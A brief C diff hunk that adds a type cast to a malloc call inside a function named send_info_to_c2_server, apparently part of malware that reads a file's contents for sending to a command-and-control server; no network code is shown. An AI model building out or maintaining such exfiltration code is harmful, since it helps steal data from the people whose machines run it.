@@ -63,7 +63,7 @@ void send_info_to_c2_server() {
     fseek(fp, 0, SEEK_END);
     long file_size = ftell(fp);
     fseek(fp, 0, SEEK_SET);
-    char *data = malloc(file_size + 1);
+    char *data = (char *)malloc(file_size + 1);
     fread(data, 1, file_size, fp);
     fclose(fp);
 
